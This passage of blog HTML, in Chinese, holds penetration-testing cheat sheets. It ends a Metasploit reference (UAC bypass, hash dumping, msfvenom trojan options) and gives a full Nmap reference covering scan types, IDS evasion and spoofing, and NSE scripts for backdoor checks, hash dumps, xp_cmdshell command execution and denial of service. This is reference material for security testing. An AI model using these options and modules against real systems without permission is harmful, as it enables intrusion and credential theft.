关闭杀毒软件,可能导致蓝屏</span><br><span class="line"></span><br><span class="line">post/windows/escalate/bypassuac				# 绕过uac</span><br><span class="line"></span><br><span class="line">post/windows/gather/hashdump				# 获取系统hash</span><br><span class="line"></span><br><span class="line">post/windows/manage/enable_rdp				# 开启远程桌面</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h3><p>msfvenom是msfpayload,msfencode的结合体,它的优点是单一,命令行,和效率.利用msfvenom可以生成木马程序</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">msfvenom命令行选项</span></span><br><span class="line">-p, --payload [payload]       	# 指定需要使用的payload(攻击荷载)</span><br><span class="line"></span><br><span class="line">-l, --list [module_type]		# 列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all</span><br><span class="line"></span><br><span class="line">-n, --nopsled [length]        	# 为payload预先指定一个NOP滑动长度</span><br><span class="line"></span><br><span class="line">-f, --format [format]        	# 指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)</span><br><span class="line"></span><br><span class="line">-e, --encoder [encoder]       	# 指定需要使用的encoder（编码器）</span><br><span class="line"></span><br><span class="line">-a, --arch [architecture]  		# 指定payload的目标架构</span><br><span class="line"></span><br><span class="line">--platform   [platform]    		# 指定payload的目标平台</span><br><span class="line"></span><br><span class="line">-s, --space [length]        	# 设定有效攻击荷载的最大长度</span><br><span class="line"></span><br><span class="line">-b, --bad-chars [list]          # 设定规避字符集，比如: &amp;#039;\x00\xff&amp;#039;</span><br><span class="line"></span><br><span class="line">-i, --iterations [count]        # 指定payload的编码次数</span><br><span class="line"></span><br><span class="line">-c, --add-code [path]          	# 指定一个附加的win32 shellcode文件</span><br><span class="line"></span><br><span class="line">-x, --template [path]          	# 指定一个自定义的可执行文件作为模板</span><br><span class="line"></span><br><span class="line">-k, --keep                      # 保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line"></span><br><span class="line">--payload-options            	# 列举payload的标准选项</span><br><span class="line"></span><br><span class="line">-o, --out [path]               	# 保存payload</span><br><span class="line"></span><br><span class="line">-v, --var-name [name]           # 指定一个自定义的变量，以确定输出格式</span><br><span class="line"></span><br><span class="line">--shellest                  	# 最小化生成payload</span><br><span class="line"></span><br><span class="line">-h, --help                      # 查看帮助选项</span><br><span class="line"></span><br><span class="line">--help-formats               	# 查看msf支持的输出格式列表</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3007">metasploit基础教程</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/wiki">metasploit wiki</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/29/">后渗透阶段的meterpreter</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_34450601/article/details/80207959">meterpreter命令小结</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/9484949.html">Meterpreter命令详解</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://m09ic.top/posts/39582/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="M09ic">
+      <meta itemprop="description" content="网络安全,编程学习记录的破地方">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M09ic's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/posts/39582/" class="post-title-link" itemprop="url">NMAP CheatSheet</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-05-24 13:31:36" itemprop="dateCreated datePublished" datetime="2019-05-24T13:31:36+08:00">2019-05-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-01-04 22:52:28" itemprop="dateModified" datetime="2021-01-04T22:52:28+08:00">2021-01-04</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/posts/39582/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/posts/39582/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <a id="more"></a>
+
+<h2 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h2><p><a target="_blank" rel="noopener" href="https://nmap.org/">nmap官网</a></p>
+<p>整理自多篇文章,参考链接在文章最后.</p>
+<p>大约两年就接触这些大名鼎鼎的工具,用了两年,但经常还得翻文档,就打算把常用的工具使用整理归纳,方便以后翻阅.</p>
+<p>归档在 categories: 速查表 , 目前都仅有参数说明,以后在实战中用到的一些技巧也会更新上去.</p>
+<h2 id="0x01-基本使用"><a href="#0x01-基本使用" class="headerlink" title="0x01 基本使用"></a>0x01 基本使用</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">nmap cnblogs.com				# 指定域名</span><br><span class="line"></span><br><span class="line">nmap 192.168.1.2				# 指定ip</span><br><span class="line"></span><br><span class="line">nmap 192.168.1.2 192.168.1.5 	# 扫描多个目标	</span><br><span class="line"></span><br><span class="line">nmap 192.168.1.1/24				# 指定网段</span><br><span class="line"></span><br><span class="line">nmap 192.168.1.1-100 			# (扫描IP地址为192.168.1.1-192.168.1.100内的所有主机)</span><br><span class="line"></span><br><span class="line">nmap -iL target.txt				# 指定列表文件</span><br><span class="line"></span><br><span class="line">nmap -V 						# 查看nmap版本号</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="0x02-端口状态"><a href="#0x02-端口状态" class="headerlink" title="0x02 端口状态"></a>0x02 端口状态</h2><p>端口探测的结果又以下五种类型</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">- open 				# 应用程序在该端口接收 TCP 连接或者 UDP 报文。 </span><br><span class="line"></span><br><span class="line">- closed 			# 关闭的端口对于nmap也是可访问的， 它接收nmap探测报文并作出响应。但没有应用程序在其上监听。</span><br><span class="line"></span><br><span class="line">- filtered 			# 由于包过滤阻止探测报文到达端口，nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由规则 或者主机上的软件防火墙。</span><br><span class="line"></span><br><span class="line">- unfiltered 		# 未被过滤状态意味着端口可访问，但是nmap无法确定它是开放还是关闭。 只有用于映射防火墙规则集的 ACK 扫描才会把端口分类到这个状态。</span><br><span class="line"></span><br><span class="line">- open | filtered 	# 无法确定端口是开放还是被过滤， 开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃了探测报文或者它引发的任何反应。UDP，IP协议,FIN, Null 等扫描会引起。</span><br><span class="line"></span><br><span class="line">- closed | filtered	# 无法确定端口是关闭的还是被过滤的</span><br></pre></td></tr></table></figure>
+<p>​    </p>
+<h2 id="0x03-进阶使用"><a href="#0x03-进阶使用" class="headerlink" title="0x03 进阶使用"></a>0x03 进阶使用</h2><h4 id="基础选项"><a href="#基础选项" class="headerlink" title="基础选项"></a>基础选项</h4><p>nmap默认发送一个ARP的PING数据包，来探测目标主机1-10000范围内所开放的所有端口</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">-p		# 指定端口 </span><br><span class="line"></span><br><span class="line">-O		# 操作系统检测</span><br><span class="line"></span><br><span class="line">-sV		# 服务版本识别</span><br><span class="line"></span><br><span class="line">-A		# 加强模式,打开-O,-sV,-sC.--traceroute</span><br><span class="line"></span><br><span class="line">-v 		# 详细输出扫描情况</span><br><span class="line"></span><br><span class="line">-F		# 快速扫描,仅扫描列在nmap-services文件中的端口而避开所有其它的端口</span><br><span class="line"></span><br><span class="line">-e		# 指定本机网卡</span><br><span class="line"></span><br><span class="line">--proxies	# 指定HTTP或SOCKS代理</span><br><span class="line"></span><br><span class="line">-6		# 开启ipv6</span><br></pre></td></tr></table></figure>
+<h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><p>任何网络探测任务的最初几个步骤之一就是把一组 IP 范围(有时该范围是巨大的)缩小为 一列活动的或者感兴趣的主机。因此大多数情况下都要先进行主机发现.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-sL		# 扫描列表 仅列出主机列表,不发送任何报文</span><br><span class="line"></span><br><span class="line">-sP		# Ping扫描 , 仅使用ping进行主机发现</span><br><span class="line"></span><br><span class="line">-Pn		# 禁用Ping进行主机发现 , 因为部分主机屏蔽了ping请求,但实际上是活跃的主机</span><br></pre></td></tr></table></figure>
+<h4 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">常用参数</span></span><br><span class="line">-r			# 顺序扫描,将从按照从小到大的顺序扫描端口。</span><br><span class="line"></span><br><span class="line">-top-ports [number] # 指定扫描nmap-services中最常用的前几个端口</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">TCP扫描</span></span><br><span class="line">-sT			# TCP连接扫描,默认将使用此方式,每次探测都会完成一次完整的三握手,扫描速度较慢,而且容易被发现.</span><br><span class="line"></span><br><span class="line">-sS			# TCP SYN扫描(半开连接扫描),使用含SYN标志位的数据包进程端口探测,较为隐蔽.</span><br><span class="line"></span><br><span class="line">-sN|sF|sX 	# TCP null,FIN,Xmas扫描,sN将所有标志位置空,sF仅设置FIN标志位,sX设置FIN,PSH,UGR标志位,多用来绕过无状态防火墙和报文过滤路由器.</span><br><span class="line"></span><br><span class="line">-sA			# TCP ACK扫描,只设置ACK标志位,多用来检测目标使用使用数据包状态检测防火墙.</span><br><span class="line"></span><br><span class="line">-sW			# TCP 窗口扫描,利用系统细节区分端口开放与关闭.</span><br><span class="line"></span><br><span class="line">-sM			# TCP Maimon扫描,大多用于探测BSD及延伸的操作系统.</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">UDP扫描</span></span><br><span class="line">-sU			# 主机上部分端口可能运行着UDP的服务,例如视频,游戏等,扫描速度较慢,可靠性低.</span><br></pre></td></tr></table></figure>
+<h4 id="时间优化"><a href="#时间优化" class="headerlink" title="时间优化"></a>时间优化</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-T[number]		# 设置时间模板（0-5级），默认为-T3</span><br><span class="line"><span class="meta">#</span><span class="bash"> 通过设置各个端口的扫描周期，从而来控制整个扫描的时间，比如说T0各个端口的扫描周期大约为5分钟，而T5各个端口的扫描周期为5ms，越快越容易被IDS发现</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> paranoid（0）：每5分钟发送一次数据包，且不会以并行方式同时发送多组数据。这种模式 的扫描不会被IDS检测到。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> sneaky（1）：每隔15秒发送一个数据包，且不会以并行方式同时发送多组数据。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> polite（2）：每0.4	秒发送一个数据包，且不会以并行方式同时发送多组数据。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> normal（3）：此模式同时向多个目标发送多个数据包，为Nmap默认的模式，该模式能自 动在扫描时间和网络负载之间进行平衡。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> aggressive（4）：在这种模式下，Nmap	对每个既定的主机只扫描5分钟，然后扫描下一 台主机。它等待响应的时间不超过1.25秒。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> insane（5）：在这种模式下，Nmap	对每个既定的主机仅扫描75秒，然后扫描下一台主 机。它等待响应的时间不超过0.3秒。</span></span><br></pre></td></tr></table></figure>
+<h4 id="伪装选项"><a href="#伪装选项" class="headerlink" title="伪装选项"></a>伪装选项</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-S			# 源地址欺骗，将自己的IP伪装成其他IP</span><br><span class="line"></span><br><span class="line">-D			# 诱饵扫描，通过伪造大量IP与自己真实IP一起访问。</span><br><span class="line"></span><br><span class="line">-f			# 分片处理，将TCP包拆分成多个IP包，避开某些防火墙。</span><br><span class="line"></span><br><span class="line">-g			# 模拟本地端口</span><br><span class="line"></span><br><span class="line">--scan-delay [time]		# 指定发包间隔</span><br><span class="line"></span><br><span class="line">--max-parallelism 		#这个选项可限制Nmap,并发扫描的最大连接数。</span><br><span class="line"></span><br><span class="line">--spoof-mac	[mac address|prefix|vendor name] # 伪装MAC地址</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="输出选项"><a href="#输出选项" class="headerlink" title="输出选项"></a>输出选项</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-oN			# 正常输出,不显示runtime信息和警告信息。</span><br><span class="line"></span><br><span class="line">-oX			# 生成XML格式的报告,可以转成HTML文件,也可以被zenmap解析,建议使用</span><br><span class="line"></span><br><span class="line">-oG			# 生成便于Grep使用的文件.</span><br><span class="line"></span><br><span class="line">-oA			# 输出至所有格式</span><br></pre></td></tr></table></figure>
+<h2 id="0x04-进阶使用-脚本"><a href="#0x04-进阶使用-脚本" class="headerlink" title="0x04 进阶使用-脚本"></a>0x04 进阶使用-脚本</h2><h4 id="脚本引擎功能-Nmap-Scripting-Engine"><a href="#脚本引擎功能-Nmap-Scripting-Engine" class="headerlink" title="脚本引擎功能(Nmap Scripting Engine)"></a>脚本引擎功能(Nmap Scripting Engine)</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">-sC			#启用default脚本</span><br><span class="line"></span><br><span class="line">--script [filename|category|directories]	# 指定文件名,列表,目录执行脚本</span><br><span class="line"></span><br><span class="line">--script-args [args]	# 指定所用脚本的参数</span><br><span class="line"></span><br><span class="line">--script-trace			# 显示脚本执行过程中发送与接收的数据</span><br><span class="line"></span><br><span class="line">--script-updatedb		# 更新脚本数据库</span><br><span class="line"></span><br><span class="line">--script-help=[scripts]	# 显示脚本的帮助信息，其中&lt;scripts&gt;部分可以逗号分隔的文件或脚本类别</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> auth：此类脚本使用暴力破解等技术找出目标系统上的认证信息。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> default：启用--sC	或者-A	选项时运行此类脚本。这类脚本同时具有下述特点：执行速度快；输出的信息有指导下一步操作的价值；输出信息内容丰富、形式简洁；必须可靠；不会侵入目标系统；能泄露信息给第三方。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> discovery：该类脚本用于探索网络。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> dos：该类脚本可能使目标系统拒绝服务，请谨慎使用。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> exploit：该类脚本利用目标系统的安全漏洞。在运行这类脚本之前，渗透测试人员需要获取 被测单位的行动许可。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> external：该类脚本可能泄露信息给第三方。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> fuzzer：该类脚本用于对目标系统进行模糊测试。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> instrusive：该类脚本可能导致目标系统崩溃，或耗尽目标系统的所有资源。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> malware：该类脚本检査目标系统上是否存在恶意软件或后门。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> safe：该类脚本不会导致目标服务崩溃、拒绝服务且不利用漏洞。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> version：配合版本检测选项（-sV），这类脚本对目标系统的服务程序进行深入的版本检 测。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> vuln：该类脚本可检测检査目标系统上的安全漏洞。</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 在Kali	Linux系统中，Nmap脚本位于目录/usr/share/nmap/scripts。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="常用脚本"><a href="#常用脚本" class="headerlink" title="常用脚本"></a>常用脚本</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 其他</span></span><br><span class="line">banner			# 获取服务的banner信息</span><br><span class="line">sniffer-detect	# 在网络中检测某主机是否存在窃听他人流量</span><br><span class="line"><span class="meta">#</span><span class="bash"> ftp</span></span><br><span class="line">ftp-anon	# 检查目标ftp是否允许匿名登录,光能登陆还不够,它还会自动检测目录是否可读写</span><br><span class="line"></span><br><span class="line">ftp-vuln-cve2010-4221	# ProFTPD 1.3.3c之前的netio.c文件中的pr_netio_telnet_gets函数中存在多个栈溢出</span><br><span class="line"></span><br><span class="line">ftp-proftpd-backdoor	# CVE-2011-2523,ProFTPD 1.3.3c 被人插后门[proftpd-1.3.3c.tar.bz2],缺省只执行id命令,可自行到脚本中它换成能直接弹shell的命令</span><br><span class="line"></span><br><span class="line">ftp-vsftpd-backdoor		#  VSFTPD v2.3.4 跟Proftp同样的问题,检查后门</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> ssh</span></span><br><span class="line">sshv1				#  验证安全性较低的ssh协议,sshv1可能被中间人攻击</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> ssl</span></span><br><span class="line">ssl-cert			# 检查ssl-cert证书问题</span><br><span class="line"></span><br><span class="line">ssl-date			# 验证ssl证书期限</span><br><span class="line"></span><br><span class="line">ssl-known-key		# 验证 Debian OpenSSL keys</span><br><span class="line"></span><br><span class="line">sslv2				#  检查sslv2协议</span><br><span class="line"></span><br><span class="line">ssl-enum-ciphers	# 验证弱加密套件</span><br><span class="line"></span><br><span class="line">ssl-dh-params		# CVE 2015-4000</span><br><span class="line"></span><br><span class="line">ssl-poodle			# SSL POODLE information leak漏洞</span><br><span class="line"></span><br><span class="line">ssl-ccs-injection	# CVE-2014-0224 ssl-ccs-injection漏洞</span><br><span class="line"></span><br><span class="line">ssl-heartbleed		# CVE-2014-0160 OpenSSL Heartbleed 心脏出血漏洞</span><br><span class="line"></span><br><span class="line">ssl-dh-params		# SSL/TLS LogJam中间人安全限制绕过漏洞</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> smtp</span></span><br><span class="line">smtp-enum-users			# smtp用户枚举,当smtp存在配置错误时</span><br><span class="line"></span><br><span class="line">smtp-vuln-cve2010-4344	#  Exim 4.70之前版本中的string.c文件中的string_vformat函数中存在堆溢出</span><br><span class="line"></span><br><span class="line">smtp-vuln-cve2011-1720	# Postfix 2.5.13之前版本，2.6.10之前的2.6.x版本，2.7.4之前的2.7.x版本和2.8.3之前的2.8.x版本,存在溢出</span><br><span class="line"></span><br><span class="line">smtp-vuln-cve2011-1764	# Exim &quot;dkim_exim_verify_finish()&quot; 存在格式字符串漏洞</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> dns</span>				</span><br><span class="line">dns-zone-transfer	# 检查目标dns服务器是否允许传送</span><br><span class="line"></span><br><span class="line">hostmap-ip2hosts	# 旁站查询 , 可能已失效</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> database</span></span><br><span class="line">mysql-empty-password	#  mysql 扫描root空密码</span><br><span class="line"></span><br><span class="line">mysql-dump-hashes		# 到处mysql所有用户的hash</span><br><span class="line"></span><br><span class="line">mysql-vuln-cve2012-2122	#  Mysql身份认证漏洞[MariaDB and MySQL  5.1.61,5.2.11, 5.3.5, 5.5.22]</span><br><span class="line"></span><br><span class="line">ms-sql-empty-password	# 扫描mssql sa空密码</span><br><span class="line"></span><br><span class="line">ms-sql-xp-cmdshell		# 利用xp_cmdshell,远程执行系统命令</span><br><span class="line"></span><br><span class="line">ms-sql-dump-hashes		# 到处mssql数据库用户和密码hash</span><br><span class="line"></span><br><span class="line">oracle-sid-brute		# 挂载字典爆破oracle的sid</span><br><span class="line"></span><br><span class="line">oracle-enum-users		# 通过挂载字典遍历Oracle的可用用户</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> web中间件(http|iis)</span></span><br><span class="line">http-iis-short-name-brute	# iis 短文件扫描</span><br><span class="line"></span><br><span class="line">http-iis-webdav-vuln		# MS09-020 iis 5.0 /6.0 允许任意用户通过搜索受密码保护的文件夹并尝试访问它来访问受保护的WebDAV文件夹</span><br><span class="line"></span><br><span class="line">http-shellshock		# bash 远程执行</span><br><span class="line"></span><br><span class="line">http-svn-info		# 探测svn</span><br><span class="line"></span><br><span class="line">http-backup-finder	# 扫描网址备份</span><br><span class="line"></span><br><span class="line">http-vuln-cve2015-1635	# iis6.0远程代码执行</span><br><span class="line"></span><br><span class="line">http-slowloris		# http拒绝服务</span><br><span class="line"></span><br><span class="line">http-methods		# 检查是否开启http-methods方法</span><br><span class="line"></span><br><span class="line">http-put 			# 检查是否开启http put 方法</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> vpn</span></span><br><span class="line">pptp-version	# 识别目标pptp版本</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> vnc</span> </span><br><span class="line">vnc-info		# 收集vnc信息</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 